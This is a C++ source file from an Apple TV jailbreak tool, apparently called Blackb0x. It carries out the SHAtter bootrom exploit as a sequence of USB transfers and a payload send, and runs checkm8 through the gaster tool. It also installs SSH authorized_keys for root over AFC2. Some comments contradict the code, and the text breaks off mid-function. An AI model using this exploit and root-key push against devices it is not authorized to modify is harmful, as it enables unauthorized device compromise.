//
//  DeviceManager.cpp
//  Blackb0x
//
//  C++/Linux port of DeviceManager.m. The checkm8/SHAtter exploit bodies and
//  the iRecovery USB helpers are ported VERBATIM from the original — this is
//  exploit-critical hardware-timing code and is not "improved" during
//  conversion, only translated from Objective-C method syntax to C++ and
//  from dispatch_async(..., ^{ view.xxx = ... }) to direct DeviceEventSink
//  callback invocations (there is no GUI event loop to marshal onto here).
//
//  Dropped entirely: AppleTVIcon's Cocoa rendering (NSImageView/NSColor/
//  NSProgressIndicator), arrangeIcons() (pure icon-grid layout math), and
//  the "is this the currently GUI-selected device" auto-continue logic in
//  the original newDevice() (view.selected_ecid / dfuHelper.isVisible /
//  jailbreakClick / tetherbootClick) — that decision belongs to the CLI
//  front end (a later phase), which can make it by observing
//  onDeviceAdded/onDeviceUpdated instead.
//

#include "DeviceManager.hpp"
#include "ResourcePath.hpp"
#include "SHAtter.h"

#include <plist/plist.h>

extern "C" {
#include <libimobiledevice/libimobiledevice.h>
#include <libimobiledevice/lockdown.h>
#include <libimobiledevice/afc.h>
}

#include <cerrno>
#include <chrono>
#include <csignal>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <thread>
#include <unistd.h>
#include <fcntl.h>
#include <poll.h>
#include <sys/wait.h>

// ---------------------------------------------------------------------------
// Forward declarations of free functions (ported verbatim from the original
// C-linkage globals in DeviceManager.m — these were never Objective-C
// methods to begin with).
// ---------------------------------------------------------------------------

static irecv_client_t get_tv(uint64_t ecid);
static void reset_counters(irecv_client_t client);
static void usb_reset(irecv_client_t client);
static void send_buffer(irecv_client_t client, unsigned char* data, unsigned long size);
static void get_data(irecv_client_t client, char* buffer, unsigned long length);
static void request_image_validation(irecv_client_t client);
static int msleep(long msec);
static const char* mode_to_str(int mode);
static int send_data(irecv_client_t client, unsigned char* data, size_t size);
static bool commandExistsOnPath(const char* name);
static int runGaster(const std::vector<std::string>& args, int timeoutSeconds = 0);
static int boot_client(irecv_client_t client, void* buf, size_t sz);
static int check_img3_file_format(irecv_client_t client, void* file, size_t sz, void** out, size_t* outsz);
static int sendiBSS_ATV31(uint64_t ecid, const char* iBSSpath);
static int sendiBSS_ATV32(uint64_t ecid, const char* path);
static void send_progress(double progress);
static int progress_cb(irecv_client_t client, const irecv_event_t* event);

extern "C" void blackb0x_irecv_device_event_cb(const irecv_device_event_t* event, void* user_data);
extern "C" void blackb0x_idevice_event_cb(const idevice_event_t* event, void* user_data);
extern "C" int blackb0x_irecv_progress_cb(irecv_client_t client, const irecv_event_t* event);

DeviceManager* DeviceManager::instance_ = nullptr;

// ---------------------------------------------------------------------------
// AppleTVDevice
// ---------------------------------------------------------------------------

// ---------------------------------------------------------------------------
// DeviceManager construction / device bookkeeping
// ---------------------------------------------------------------------------

DeviceManager::DeviceManager() {
    instance_ = this;

    irecv_device_event_context_t ctx;
    irecv_device_event_subscribe(&ctx, blackb0x_irecv_device_event_cb, nullptr);
    // Normal-mode discovery goes through the real system usbmuxd again (see
    // docs/HISTORY.md) — it must be run with --no-preflight for this project's
    // target hardware (pre-2013 Apple TV/iOS), whose lockdownd predates
    // what usbmuxd's own preflight step can negotiate and would otherwise
    // never be exposed via idevice_get_device_list()/this callback at all.
    idevice_event_subscribe(blackb0x_idevice_event_cb, nullptr);
}

std::vector<AppleTVDevice> DeviceManager::devicesSnapshot() const {
    std::lock_guard<std::mutex> lock(devicesMutex_);
    return std::vector<AppleTVDevice>(devices_.begin(), devices_.end());
}

AppleTVDevice* DeviceManager::deviceWithUDID(const std::string& udid, uint64_t ecid) {
    std::lock_guard<std::mutex> lock(devicesMutex_);
    for (auto& icon : devices_) {
        if (!udid.empty() && icon.udid == udid) return &icon;
        if (ecid != 0 && icon.ecid == ecid) return &icon;
    }
    return nullptr;
}

void DeviceManager::newDevice(const std::string& productType, const std::string& modeStr,
                               const std::string& version, const std::string& buildID,
                               uint64_t ecid, const std::string& udid, int pwnedDFU) {
    if (productType.empty()) return;
    if (productType.find("AppleTV3") == std::string::npos &&
        productType.find("AppleTV2") == std::string::npos) return;

    AppleTVDevice* icon = deviceWithUDID(udid, ecid);
    bool isNew = false;
    if (!icon) {
        std::lock_guard<std::mutex> lock(devicesMutex_);
        devices_.push_back(AppleTVDevice{});
        icon = &devices_.back();
        icon->udid = udid;
        icon->ecid = ecid;
        isNew = true;
    }

    if (productType == "AppleTV3,2" || productType == "AppleTV3,1") {
        if (modeStr == "Recovery") {
            icon->buildID.clear();
            icon->version.clear();
            if (icon->waitForRecovery == 1) {
                if (sink_.onStatus) {
                    sink_.onStatus("Done! Connect your AppleTV to a TV. You will be able to "
                                   "use it once it automatically restarts itself.");
                }
                icon->version = "Recovery - Jailbroken";
            } else {
                icon->version = "Recovery";
            }
        }
    }

    if (!version.empty()) {
        icon->buildID = buildID;
        icon->version = version;
    }

    icon->deviceModel = productType;
    icon->mode = modeStr;
    icon->connected = 1;
    icon->pwnedDFU = pwnedDFU;

    if (isNew && sink_.onDeviceAdded) {
        sink_.onDeviceAdded(*icon);
    } else if (sink_.onDeviceUpdated) {
        sink_.onDeviceUpdated(*icon);
    }

    if (icon->mode == "Normal") {
        std::string udidCopy = icon->udid;
        std::thread([this, udidCopy]() { checkJailbreak(udidCopy); }).detach();
    }
}

void DeviceManager::disconnectDevice(uint64_t ecid, const std::string& udid) {
    AppleTVDevice* match = deviceWithUDID(udid, (ecid != (uint64_t)-1) ? ecid : 0);
    if (match) {
        std::lock_guard<std::mutex> lock(devicesMutex_);
        match->connected = 0;
    }
    if (sink_.onDeviceRemoved) sink_.onDeviceRemoved(ecid, udid);
}

// ---------------------------------------------------------------------------
// Exploits
// ---------------------------------------------------------------------------
// SHAtter and checkm8 are ported byte-for-byte from the original: same
// sequence of USB control transfers, same buffer sizes, same sleep amounts.
// The only change is routing status/progress through sink_ instead of
// dispatch_async(dispatch_get_main_queue(), ^{ view.xxx = ... }).

int DeviceManager::SHAtter(uint64_t ecid) {
    irecv_client_t client = get_tv(ecid);

    auto status = [this](const char* s) { if (sink_.onStatus) sink_.onStatus(s); };
    auto progress = [this](double p) { if (sink_.onProgress) sink_.onProgress(p); };

    status("Preparing buffer overflow");
    progress(5.0);

    char data_one[0x40];
    memset(data_one, 0, 0x40);
    reset_counters(client);
    get_data(client, data_one, 0x40);
    progress(15.0);

    usb_reset(client);
    irecv_close(client);

    status("Requesting validation");

    client = get_tv(ecid);
    request_image_validation(client);
    irecv_close(client);

    status("Filling buffer with zeros");
    progress(25.0);
    char data_two[0x2C000];
    memset(data_two, 0, 0x2C000);

    client = get_tv(ecid);
    get_data(client, data_two, 0x2C000);
    progress(30.0);
    irecv_close(client);

    msleep(500);

    status("Overwriting SHA1 registers");
    progress(35.0);
    char data_three[0x140];
    memset(data_three, 0, 0x140);

    client = get_tv(ecid);
    reset_counters(client);
    progress(40.0);
    get_data(client, data_three, 0x140);
    usb_reset(client);
    irecv_close(client);

    client = get_tv(ecid);
    progress(55.0);
    request_image_validation(client);
    irecv_close(client);

    status("Sending SHAtter payload");

    char data_four[0x2C000];
    memset(data_four, 0, 0x2C000);

    client = get_tv(ecid);
    progress(65.0);

    send_buffer(client, SHAtter_payload, 0x800);
    progress(85.0);
    status("Overwriting exception vectors");

    get_data(client, data_four, 0x2C000);
    progress(90.0);

    irecv_close(client);

    msleep(500);

    progress(100.0);
    status("SHAtter successful");

    return 1;
}

// get_tv() gives up after ~6 one-second attempts — fine for reconnecting to
// a device already sitting quietly in a known DFU/Recovery state, but not
// patient enough for the moments in checkm8() where the device is actively
// re-initializing its own USB stack (after a bus reset, or after running
// injected SecureROM-level code) and may need meaningfully longer than 6
// seconds to reappear, especially through some xHCI/Thunderbolt host
// controllers. Confirmed necessary directly: a real run got all the way
// through "Executing payload" and still hit get_tv()'s own give-up path
// right after. gaster (github.com/verygenericname/gaster) — the checkm8
// implementation actually used by palera1n today, a real, actively
// maintained, cross-platform tool for this exact exploit — takes this to
// its logical extreme: its own USB-wait helper never gives up at all,
// just polls in an unbounded loop until the device reappears or the user
// kills the process. attempts=30 here isn't unbounded (the CLI should
// still eventually report a real failure instead of hanging forever) but
// is deliberately far more patient than get_tv()'s own default.
static irecv_client_t get_tv_patient(uint64_t ecid, int attempts = 30) {
    irecv_client_t client = nullptr;
    for (int attempt = 0; attempt < attempts && !client; attempt++) {
        if (attempt > 0) sleep(1);
        client = get_tv(ecid);
    }
    return client;
}

// Checks /proc/<pid>/status for "D (disk sleep)" — uninterruptible sleep,
// the one process state SIGKILL cannot terminate; the kernel only wakes a
// D-state task when whatever blocking call it's in returns on its own.
// Used to give a specific, actionable diagnostic instead of a generic
// "still running" message when a kill attempt has no visible effect.
static bool isUninterruptible(pid_t pid) {
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/status", (int)pid);
    FILE* f = fopen(path, "r");
    if (!f) return false;
    char line[256];
    bool result = false;
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "State:", 6) == 0) {
            result = strstr(line, "(disk sleep)") != nullptr;
            break;
        }
    }
    fclose(f);
    return result;
}

// Manual PATH search (no shell/system() — matches this file's own
// no-shell convention elsewhere) for whether a bare command name resolves
// to an executable file. Used to require `stdbuf` up front rather than
// discovering its absence mid-exploit.
static bool commandExistsOnPath(const char* name) {
    const char* pathEnv = getenv("PATH");
    if (!pathEnv) return false;
    std::string path(pathEnv);
    size_t start = 0;
    while (start <= path.size()) {
        size_t colon = path.find(':', start);
        std::string dir = path.substr(start, colon == std::string::npos ? std::string::npos : colon - start);
        if (!dir.empty()) {
            std::string candidate = dir + "/" + name;
            if (access(candidate.c_str(), X_OK) == 0) return true;
        }
        if (colon == std::string::npos) break;
        start = colon + 1;
    }
    return false;
}

// Spawns the vendored `gaster` binary (third_party/gaster, built as its own
// executable alongside blackb0x — see CMakeLists.txt), streaming its
// stdout/stderr straight through to blackb0x's own stdout/stderr, verbatim
// and live rather than buffered-then-dumped-on-failure — genuinely useful
// for this exploit specifically, since a stuck or failing run is exactly
// the kind of thing worth watching happen in real time. Bounded by
// timeoutSeconds (0 = no timeout): gaster's own wait-for-device and
// pwn-retry loops are genuinely unbounded (see the docs/HISTORY.md entry on this
// switch), and this project's CLI needs to eventually give up instead of
// hanging forever if the device is gone for good — SIGTERM, then SIGKILL,
// on timeout.
//
// SIGKILL is not actually guaranteed to work here: a process blocked
// inside a kernel-level USB control-transfer syscall sits in
// uninterruptible sleep ("D" state, isUninterruptible() above) until that
// specific syscall returns — confirmed to happen for real against this
// exact hardware (gaster stuck in D state, unresponsive to
// SIGTERM/SIGKILL, for well over a minute, while a completely independent
// fresh libusb session against the same device worked fine moments
// earlier — see docs/HISTORY.md). No signal can interrupt that; the only real
// fixes are the kernel's own I/O eventually giving up, or physically
// unplugging the device to force it. Rather than block blackb0x itself
// waiting on an unkillable child (a real bug in an earlier version of this
// function: its post-SIGKILL cleanup used a *blocking* waitpid(), which
// just moved the hang from gaster into blackb0x itself, confirmed live
// against this same stuck process), this gives the kill a short bounded
// grace period, diagnoses+reports a D-state explicitly if it's still
// there, and moves on regardless — leaving the child to be reaped
// whenever/if the kernel call it's stuck in ever actually returns.
static int runGaster(const std::vector<std::string>& args, int timeoutSeconds) {
    // Prefixed with `stdbuf -oL -eL`: glibc's stdio only line-buffers
    // stdout/stderr when they're attached to a terminal — attached to a
    // pipe (exactly what this function does below), it silently switches
    // to full block buffering instead, and gaster.c never calls
    // setvbuf()/fflush() itself. Confirmed directly: a short-lived gaster
    // invocation (no args, prints usage then exits) shows its output fine
    // either way, since exit() flushes stdio regardless — but a `gaster
    // pwn` that runs for a long time before ever exiting (exactly the
    // "stuck" scenario this timeout/D-state handling exists for) would
    // never flush its "Stage: RESET"/"Stage: SETUP"/etc. progress lines to
    // the pipe at all, making the live-streaming above silently useless for
    // the one case it actually matters for. `stdbuf` (GNU coreutils,
    // LD_PRELOADs a constructor that calls setvbuf() before gaster's own
    // main() runs) fixes this without needing to fork gaster.c just to add
    // a setvbuf() call.
    //
    // Treated as a hard requirement, not a nice-to-have: an earlier version
    // of this function fell back to running gaster unbuffered if stdbuf
    // wasn't found, which silently reintroduces exactly the "blind the
    // whole time" blind spot documented in docs/HISTORY.md — the one this
    // whole mechanism exists to fix, and precisely when it would matter
    // most (a stuck/hanging exploit run). Fail loudly and immediately
    // instead, before ever forking gaster.
    if (!commandExistsOnPath("stdbuf")) {
        fprintf(stderr,
                "checkm8: `stdbuf` (GNU coreutils) is required but not found on PATH -- "
                "without it, gaster's exploit progress can't be streamed live, which makes "
                "a stuck/hanging run indistinguishable from a silently-working one. Install "
                "coreutils and try again.\n");
        return -1;
    }
    std::vector<std::string> argvStrings = { "stdbuf", "-oL", "-eL", resolveGasterPath() };
    argvStrings.insert(argvStrings.end(), args.begin(), args.end());
    std::vector<char*> cargv;
    cargv.reserve(argvStrings.size() + 1);
    for (auto& a : argvStrings) cargv.push_back(const_cast<char*>(a.c_str()));
    cargv.push_back(nullptr);

    int outPipe[2], errPipe[2];
    if (pipe(outPipe) != 0) return -1;
    if (pipe(errPipe) != 0) {
        close(outPipe[0]);
        close(outPipe[1]);
        return -1;
    }

    pid_t pid = fork();
    if (pid < 0) {
        close(outPipe[0]);
        close(outPipe[1]);
        close(errPipe[0]);
        close(errPipe[1]);
        return -1;
    }
    if (pid == 0) {
        close(outPipe[0]);
        close(errPipe[0]);
        dup2(outPipe[1], STDOUT_FILENO);
        dup2(errPipe[1], STDERR_FILENO);
        close(outPipe[1]);
        close(errPipe[1]);
        execvp("stdbuf", cargv.data());
        // Only reachable if stdbuf disappeared between the PATH check above
        // and this exec (a real TOCTOU window, not expected in practice) --
        // no silent fallback here, per the "required" reasoning above.
        _exit(127);
    }
    close(outPipe[1]);
    close(errPipe[1]);
    fcntl(outPipe[0], F_SETFL, O_NONBLOCK);
    fcntl(errPipe[0], F_SETFL, O_NONBLOCK);

    auto pump = [&]() {
        char buf[512];
        ssize_t n;
        while ((n = read(outPipe[0], buf, sizeof(buf))) > 0) fwrite(buf, 1, (size_t)n, stdout);
        while ((n = read(errPipe[0], buf, sizeof(buf))) > 0) fwrite(buf, 1, (size_t)n, stderr);
        fflush(stdout);
        fflush(stderr);
    };

    auto deadline = std::chrono::steady_clock::now() + std::chrono::seconds(timeoutSeconds);
    bool timedOut = false;
    int status = 0;
    for (;;) {
        pump();
        pid_t r = waitpid(pid, &status, WNOHANG);
        if (r == pid) break;
        if (timeoutSeconds > 0 && std::chrono::steady_clock::now() >= deadline) {
            timedOut = true;
            break;
        }
        struct pollfd pfds[2] = { { outPipe[0], POLLIN, 0 }, { errPipe[0], POLLIN, 0 } };
        poll(pfds, 2, 200);
    }

    if (timedOut) {
        kill(pid, SIGTERM);
        bool reaped = false;
        for (int i = 0; i < 10 && !reaped; i++) {
            usleep(100000);
            pump();
            reaped = waitpid(pid, &status, WNOHANG) == pid;
        }
        if (!reaped) {
            kill(pid, SIGKILL);
            for (int i = 0; i < 10 && !reaped; i++) {
                usleep(100000);
                pump();
                reaped = waitpid(pid, &status, WNOHANG) == pid;
            }
        }
        if (!reaped) {
            if (isUninterruptible(pid)) {
                fprintf(stderr,
                        "checkm8: gaster (pid %d) is stuck in an uninterruptible kernel USB "
                        "wait and can't be killed by software. It will keep running in the "
                        "background until whatever syscall it's blocked in returns on its own "
                        "-- this usually needs the Apple TV physically unplugged from USB to "
                        "clear. Continuing without waiting for it further.\n",
                        (int)pid);
            } else {
                fprintf(stderr, "checkm8: gaster (pid %d) did not exit after SIGKILL.\n", (int)pid);
            }
        }
    }

    pump();
    close(outPipe[0]);
    close(errPipe[0]);

    if (timedOut) return -2;
    if (!WIFEXITED(status)) return -1;
    return WEXITSTATUS(status);
}

// The low-level USB request sequence/payload/timing that used to live
// directly in this function (hand-ported from the original
// DeviceManager.m) is gone: checkm8Attempt() now shells out to the
// vendored `gaster` binary for the actual pwn step instead. gaster is the
// real checkm8 implementation palera1n's `legacy` branch shells out to
// (not a from-scratch reimplementation of our own), open source, and
// confirmed via its own per-chip config table to support this exact
// device/firmware (cpid 0x8947, "SRTG:[iBoot-1458.2]" — byte-identical to
// this file's old hand-ported exploit parameters, so this switch was never
// about our own port being wrong; it's about running a real, actively-used
// implementation instead of one nobody but this laptop has ever exercised).
// checkra1n — what current/mainline palera1n uses instead of gaster — was
// ruled out: it has never supported A5-family chips at all, only A7 and up
// (see docs/HISTORY.md for the full writeup). After a successful `gaster pwn`,
// this still reconnects and checks for "PWND:[" in the serial string
// itself, same as before — gaster reports its own success/failure via exit
// status, but that's still worth confirming independently before handing
// control back to the rest of this project's own boot-chain code
// (sendiBSS/sendiBEC/etc., all unchanged).
bool DeviceManager::checkm8Attempt(uint64_t ecid) {
    auto status = [this](const char* s) { if (sink_.onStatus) sink_.onStatus(s); };
    auto progress = [this](double p) { if (sink_.onProgress) sink_.onProgress(p); };

    // The device may already be sitting in pwned DFU before gaster is ever
    // invoked: checkm8()'s own retry loop calling this function again, a
    // previous CLI run that got killed/crashed after gaster's pwn actually
    // succeeded but before this function's own post-pwn verification ran,
    // or gaster itself finishing the pwn in the background after this
    // project gave up waiting on it (see runGaster()'s timeout/D-state
    // handling above — this is exactly the scenario that produces:
    // confirmed live, a `gaster pwn` stuck past its own timeout while the
    // device had, per this same check, already rebooted into pwned DFU).
    // Re-running the exploit against an already-pwned device is pointless
    // at best; check first, quickly (get_tv(), not get_tv_patient() — if
    // it's not there within get_tv()'s own short default, it's almost
    // certainly not already pwned and yet-unconnected, not worth 30
    // seconds of patience just to rule that out), and skip straight to
    // success if it's already there.
    {
        irecv_client_t already = get_tv(ecid);
        if (already) {
            const struct irecv_device_info* info = irecv_get_device_info(already);
            bool alreadyPwned = info && strstr(info->serial_string, "PWND:[");
            irecv_close(already);
            if (alreadyPwned) {
                status("Device already in pwned DFU");
                status("Checkm8 successful");
                progress(100.0);
                return 1;
            }
        }
    }

    status("Exploiting with checkm8");
    progress(10.0);

    int exitCode = runGaster({"pwn"}, 180);
    if (exitCode != 0) {
        if (exitCode == -2) {
            fprintf(stderr, "checkm8: gaster pwn timed out waiting for the device.\n");
        } else {
            fprintf(stderr, "checkm8: gaster pwn failed (exit %d).\n", exitCode);
        }
        runGaster({"reset"}, 15);
        status("Checkm8 unsuccessful");
        progress(100.0);
        return 0;
    }

    progress(80.0);

    irecv_client_t client = get_tv_patient(ecid);
    if (!client) {
        fprintf(stderr, "checkm8: device did not reappear after gaster pwn.\n");
        status("Checkm8 unsuccessful");
        progress(100.0);
        return 0;
    }

    const struct irecv_device_info* info = irecv_get_device_info(client);
    if (!info || !strstr(info->serial_string, "PWND:[")) {
        irecv_close(client);
        fprintf(stderr, "checkm8: device did not report pwned DFU after gaster pwn.\n");
        status("Checkm8 unsuccessful");
        progress(100.0);
        return 0;
    }

    status("Checkm8 successful");
    progress(100.0);

    irecv_close(client);
    return 1;
}

// gaster itself already retries internally and unboundedly within a single
// `gaster pwn` invocation (its RESET -> SETUP -> SPRAY -> PATCH state
// machine resets and starts over on any stage failure on its own) — this
// outer retry is now mostly a safety net for the rarer case of a hard
// failure/timeout out of runGaster() itself (e.g. gaster exiting outright,
// or this project's own 180s ceiling on top of gaster's patience being
// hit). kMaxAttempts stays finite so the CLI still eventually reports a
// real, actionable failure rather than retrying forever.
int DeviceManager::checkm8(uint64_t ecid) {
    constexpr int kMaxAttempts = 3;
    for (int attempt = 1; attempt <= kMaxAttempts; attempt++) {
        if (checkm8Attempt(ecid)) return 1;
        if (attempt < kMaxAttempts) {
            if (sink_.onStatus) sink_.onStatus("checkm8 attempt failed, retrying...");
            sleep(1);
        }
    }
    return 0;
}

static void reset_counters(irecv_client_t client) {
    irecv_reset_counters(client);
}

static void usb_reset(irecv_client_t client) {
    irecv_reset(client);
}

static void send_buffer(irecv_client_t client, unsigned char* data, unsigned long size) {
    irecv_send_buffer(client, data, size, 0);
}

static void get_data(irecv_client_t client, char* buffer, unsigned long length) {
    irecv_recv_buffer(client, buffer, length);
}

static void request_image_validation(irecv_client_t client) {
    irecv_usb_control_transfer(client, 0x21, 1, 0, 0, nullptr, 0, 1000);

    unsigned char blank[16];
    memset(blank, 0, 16);

    irecv_usb_control_transfer(client, 0xA1, 3, 0, 0, blank, 6, 1000);
    irecv_usb_control_transfer(client, 0xA1, 3, 0, 0, blank, 6, 1000);
    irecv_usb_control_transfer(client, 0xA1, 3, 0, 0, blank, 6, 1000);
    usb_reset(client);
}

static int msleep(long msec) {
    struct timespec ts;
    int res;

    if (msec < 0) {
        errno = EINVAL;
        return -1;
    }

    ts.tv_sec = msec / 1000;
    ts.tv_nsec = (msec % 1000) * 1000000;

    do {
        res = nanosleep(&ts, &ts);
    } while (res && errno == EINTR);

    return res;
}

// ---------------------------------------------------------------------------
// AFC connection (jailbreak detection)
// ---------------------------------------------------------------------------

// Uses the from-scratch AfcClient (see AfcClient.hpp) over the in-process
// mux — this tool's target hardware is never reachable through the system
// usbmuxd, so there is no other path to try (see docs/HISTORY.md).
int isJailbroken(const std::string& udid) {
    idevice_t device = nullptr;
    if (idevice_new(&device, udid.c_str()) != IDEVICE_E_SUCCESS) {
        return -1;
    }

    lockdownd_client_t lockdown_client = nullptr;
    if (lockdownd_client_new_with_handshake(device, &lockdown_client, "blackb0x") != LOCKDOWN_E_SUCCESS) {
        idevice_free(device);
        return -1;
    }

    lockdownd_service_descriptor_t port = nullptr;
    if (lockdownd_start_service(lockdown_client, "com.apple.afc", &port) != LOCKDOWN_E_SUCCESS) {
        lockdownd_client_free(lockdown_client);
        idevice_free(device);
        return -1;
    }

    afc_client_t afc_client = nullptr;
    if (afc_client_new(device, port, &afc_client) != AFC_E_SUCCESS) {
        lockdownd_client_free(lockdown_client);
        idevice_free(device);
        return -1;
    }

    int jailbroken = 0;
    char** dirs = nullptr;
    afc_read_directory(afc_client, "/", &dirs);

    if (dirs) {
        for (int i = 0; dirs[i]; i++) {
            if (strcmp(dirs[i], ".blackb0x") == 0) jailbroken = 1;
            free(dirs[i]);
        }
        free(dirs);
    }

    afc_client_free(afc_client);
    lockdownd_client_free(lockdown_client);
    idevice_free(device);

    return dirs ? jailbroken : -1;
}

int isJailbreakRunning(const std::string& udid) {
    idevice_t device = nullptr;
    if (idevice_new(&device, udid.c_str()) != IDEVICE_E_SUCCESS) {
        return -1;
    }

    lockdownd_client_t lockdown_client = nullptr;
    if (lockdownd_client_new_with_handshake(device, &lockdown_client, "blackb0x") != LOCKDOWN_E_SUCCESS) {
        idevice_free(device);
        return -1;
    }

    lockdownd_service_descriptor_t port = nullptr;
    lockdownd_error_t lderr = lockdownd_start_service(lockdown_client, "com.apple.afc2", &port);

    lockdownd_client_free(lockdown_client);
    idevice_free(device);

    if (lderr != LOCKDOWN_E_SUCCESS) {
        return 0;
    }

    return 1;
}

bool pushAuthorizedKeys(const std::string& udid, const std::string& authorizedKeysContents) {
    idevice_t device = nullptr;
    if (idevice_new(&device, udid.c_str()) != IDEVICE_E_SUCCESS) {
        return false;
    }

    lockdownd_client_t lockdown_client = nullptr;
    if (lockdownd_client_new_with_handshake(device, &lockdown_client, "blackb0x") != LOCKDOWN_E_SUCCESS) {
        idevice_free(device);
        return false;
    }

    lockdownd_service_descriptor_t port = nullptr;
    if (lockdownd_start_service(lockdown_client, "com.apple.afc2", &port) != LOCKDOWN_E_SUCCESS) {
        lockdownd_client_free(lockdown_client);
        idevice_free(device);
        return false;
    }

    afc_client_t afc_client = nullptr;
    if (afc_client_new(device, port, &afc_client) != AFC_E_SUCCESS) {
        lockdownd_client_free(lockdown_client);
        idevice_free(device);
        return false;
    }

    // May already exist (harmless — afc_make_directory just fails EEXIST-ish
    // in that case); either way afc_file_open below is what actually matters.
    afc_make_directory(afc_client, "/private/var/root/.ssh");

    bool ok = false;
    uint64_t handle = 0;
    if (afc_file_open(afc_client, "/private/var/root/.ssh/authorized_keys", AFC_FOPEN_WRONLY, &handle) ==
        AFC_E_SUCCESS) {
        uint32_t written = 0;
        ok = afc_file_write(afc_client, handle, authorizedKeysContents.data(),
                             (uint32_t)authorizedKeysContents.size(), &written) == AFC_E_SUCCESS &&
             written == authorizedKeysContents.size();
        afc_file_close(afc_client, handle);
    }

    afc_client_free(afc_client);
    lockdownd_client_free(lockdown_client);
    idevice_free(device);
    return ok;
}

// waitForAFC2's original recursive NSThread-sleep retry, now a plain
// blocking loop — safe because it always runs on a detached background
// thread (see DeviceManager::checkJailbreak).
void DeviceManager::checkJailbreakRunning(const std::string& udid) {
    int jb = -1;
    for (int attempts = 5; attempts > 0; attempts--) {
        jb = isJailbreakRunning(udid);
        if (jb != -1) break;
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }

    AppleTVDevice* icon = deviceWithUDID(udid);
    if (!icon) return;

    {
        std::lock_guard<std::mutex> lock(devicesMutex_);
        icon->jailbreakRunning = jb;
    }

    if (sink_.onDeviceUpdated) sink_.onDeviceUpdated(*icon);
}

// checkJailbreak's original recursive dispatch_after retry (on the main
// queue, to avoid blocking it) is now a plain blocking loop — safe because
// it always runs on a detached background thread (see newDevice()).
void DeviceManager::checkJailbreak(const std::string& udid) {
    if (udid.empty()) return;

    int jailbroken = -1;
    while (jailbroken == -1) {
        jailbroken = isJailbroken(udid);
        if (jailbroken == -1) {
            std::this_thread::sleep_for(std::chrono::milliseconds(300));
        }
    }

    AppleTVDevice* icon = deviceWithUDID(udid);
    if (!icon) return;

    {
        std::lock_guard<std::mutex> lock(devicesMutex_);
        if (icon->jailbroken != 1) icon->jailbroken = jailbroken;
    }

    if (sink_.onDeviceUpdated) sink_.onDeviceUpdated(*icon);

    if (jailbroken) {
        checkJailbreakRunning(udid);
    } else {
        std::lock_guard<std::mutex> lock(devicesMutex_);
        icon->jailbreakRunning = 0;
    }
}

// ---------------------------------------------------------------------------
// Events and callbacks
// ---------------------------------------------------------------------------

static int progress_cb(irecv_client_t client, const irecv_event_t* event) {
    (void)client;
    if (DeviceManager::instance() && DeviceManager::instance()->sink().onProgress) {
        DeviceManager::instance()->sink().onProgress(event->progress);
    }
    return 0;
}

extern "C" int blackb0x_irecv_progress_cb(irecv_client_t client, const irecv_event_t* event) {
    return progress_cb(client, event);
}

extern "C" void blackb0x_irecv_device_event_cb(const irecv_device_event_t* event, void* user_data) {
    (void)user_data;
    if (!DeviceManager::instance()) return;

    uint64_t ecid = event->device_info->ecid;

    if (event->type == IRECV_DEVICE_ADD) {
        irecv_client_t client = get_tv(ecid);
        irecv_device_t device = nullptr;
        irecv_devices_get_device_by_client(client, &device);

        int mode = 0;
        irecv_get_mode(client, &mode);

        const char* modeStr = mode_to_str(mode);
        const char* productType = device ? device->product_type : "";

        int pwnedDFU = 0;
        const char* serial = event->device_info->serial_string;
        if (serial && strstr(serial, "SHAtter")) pwnedDFU = 1;
        if (serial && strstr(serial, "checkm8")) pwnedDFU = 2;

        DeviceManager::instance()->newDevice(productType ? productType : "", modeStr, "", "",
                                              ecid, "", pwnedDFU);

        irecv_close(client);
    } else {
        DeviceManager::instance()->disconnectDevice(ecid, "");
    }
}

extern "C" void blackb0x_idevice_event_cb(const idevice_event_t* event, void* user_data) {
    (void)user_data;
    if (!DeviceManager::instance()) return;
    if (event->udid == nullptr) return;
    if (event->conn_type == CONNECTION_NETWORK) return;

    std::string udid = event->udid;

    switch (event->event) {
        case IDEVICE_DEVICE_ADD: {
            NormalModeInfo info = plistInfoForDeviceUUID(udid);
            DeviceManager::instance()->newDevice(info.productType, "Normal", info.productVersion,
                                                  info.buildVersion, info.uniqueChipID,
                                                  info.uniqueDeviceID, 0);
            break;
        }
        case IDEVICE_DEVICE_PAIRED:
            break;
        case IDEVICE_DEVICE_REMOVE:
            DeviceManager::instance()->disconnectDevice((uint64_t)-1, udid);
            break;
        default:
            break;
    }
}

static const char* mode_to_str(int mode) {
    switch (mode) {
        case IRECV_K_RECOVERY_MODE_1:
        case IRECV_K_RECOVERY_MODE_2:
        case IRECV_K_RECOVERY_MODE_3:
        case IRECV_K_RECOVERY_MODE_4:
            return "Recovery";
        case IRECV_K_DFU_MODE:
            return "DFU";
        case IRECV_K_WTF_MODE:
            return "WTF";
        default:
            return "Unknown";
    }
}

// ---------------------------------------------------------------------------
// iRecovery functions (shared)
// ---------------------------------------------------------------------------

irecv_client_t DeviceManager::get_tv(uint64_t ecid) {
    return ::get_tv(ecid);
}

static irecv_client_t get_tv(uint64_t ecid) {
    irecv_client_t client = nullptr;

    for (int i = 0; i <= 5; i++) {
        irecv_error_t err = irecv_open_with_ecid(&client, ecid);

        if (err == IRECV_E_UNSUPPORTED) {
            fprintf(stderr, "ERROR: %s\n", irecv_strerror(err));
            return nullptr;
        } else if (err != IRECV_E_SUCCESS) {
            sleep(1);
        } else {
            break;
        }

        if (i == 5) {
            fprintf(stderr, "ERROR: %s\n", irecv_strerror(err));
            return nullptr;
        }
    }

    irecv_event_subscribe(client, IRECV_PROGRESS, &blackb0x_irecv_progress_cb, nullptr);
    return client;
}

// ---------------------------------------------------------------------------
// MobileDevice plist handling
// ---------------------------------------------------------------------------
// Replaces dictionaryFromPlist:'s generic NSDictionary conversion with a
// direct extraction of just the fields Blackb0x actually consumes (see
// addDeviceWithInfo: in the original).

// Uses LegacyLockdownClient over the in-process mux -- this tool's target
// hardware is never reachable through the system usbmuxd, so there is no
// other path to try (see docs/HISTORY.md).
NormalModeInfo plistInfoForDeviceUUID(const std::string& udid) {
    NormalModeInfo out;

    idevice_t device = nullptr;
    if (idevice_new_with_options(&device, udid.c_str(), IDEVICE_LOOKUP_USBMUX) != IDEVICE_E_SUCCESS) {
        return out;
    }

    lockdownd_client_t client = nullptr;
    if (lockdownd_client_new_with_handshake(device, &client, "blackb0x") != LOCKDOWN_E_SUCCESS) {
